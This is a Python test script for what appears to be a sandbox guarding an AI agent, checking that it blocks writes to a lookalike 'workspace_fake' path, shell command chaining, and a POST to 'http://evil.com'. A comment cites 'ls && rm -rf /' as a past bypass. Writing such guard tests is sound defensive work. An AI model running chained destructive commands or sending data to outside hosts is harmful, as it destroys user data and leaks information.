import sys
import os
import subprocess
import shutil
import requests
from pathlib import Path

# Add src to path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from src.core import activate_sentinel
from src.policy import PolicyEnforcer

activate_sentinel()

print("--- 🛡️ VERIFICATION START ---")

fake_workspace_dir = Path(os.path.abspath("./workspace_fake"))

# TEST 1: The "Fake Workspace" Attack
# Old Vulnerability: allowed_path="./workspace" matched "./workspace_fake"
print("\n[TEST 1] Testing Path Traversal (Fake Workspace)...")
fake_path = fake_workspace_dir / "secret.txt"
try:
    # Ensure directory exists for the test to be valid logic-wise
    os.makedirs(os.path.dirname(str(fake_path)), exist_ok=True)
    with open(str(fake_path), "w") as f:
        f.write("I should not be able to write here.")
    print("❌ FAILED: Agent wrote to fake workspace!")
except Exception as e:
    print(f"✅ PASSED: Blocked write to {fake_path}")
    print(f"   Reason: {e}")

# TEST 2: The "Shell Chaining" Attack
# Old Vulnerability: "ls && rm -rf /" passed because it started with "ls"
print("\n[TEST 2] Testing Shell Injection (&& chaining)...")
try:
    subprocess.run("ls && echo 'Hacked'", shell=True)
    print("❌ FAILED: Shell chaining executed!")
except Exception as e:
    print(f"✅ PASSED: Blocked shell chaining.")
    print(f"   Reason: {e}")

# TEST 3: subprocess.Popen interception
print("\n[TEST 3] Testing subprocess.Popen interception...")
try:
    subprocess.Popen("ls && echo 'Hacked'", shell=True)
    print("❌ FAILED: subprocess.Popen chaining executed!")
except Exception as e:
    print("✅ PASSED: Blocked subprocess.Popen chaining.")
    print(f"   Reason: {e}")

# TEST 4: os.system interception
print("\n[TEST 4] Testing os.system interception...")
try:
    os.system("ls && echo 'Hacked'")
    print("❌ FAILED: os.system chaining executed!")
except Exception as e:
    print("✅ PASSED: Blocked os.system chaining.")
    print(f"   Reason: {e}")

# TEST 5: requests.post interception
print("\n[TEST 5] Testing requests.post network interception...")
try:
    requests.post("http://evil.com", json={"x": 1})
    print("❌ FAILED: requests.post to blocked host executed!")
except Exception as e:
    print("✅ PASSED: Blocked requests.post to disallowed host.")
    print(f"   Reason: {e}")

# TEST 6: policy loading should not depend on current working directory
print("\n[TEST 6] Testing CWD-independent policy loading...")
original_cwd = os.getcwd()
try:
    os.chdir(Path(__file__).resolve().parents[2])
    enforcer = PolicyEnforcer()
    if enforcer.policy.get("allowed_paths"):
        print("✅ PASSED: Policy loaded correctly outside sentinel-guard CWD.")
    else:
        print("❌ FAILED: Policy loaded empty outside sentinel-guard CWD.")
finally:
    os.chdir(original_cwd)

# Teardown: cleanup test artifact if it exists.
if fake_workspace_dir.exists() and fake_workspace_dir.is_dir():
    try:
        shutil.rmtree(fake_workspace_dir)
        print(f"\n[TEARDOWN] Removed test artifact: {fake_workspace_dir}")
    except Exception as e:
        print(f"\n[TEARDOWN] Could not remove {fake_workspace_dir}: {e}")

print("\n--- 🛡️ VERIFICATION END ---")
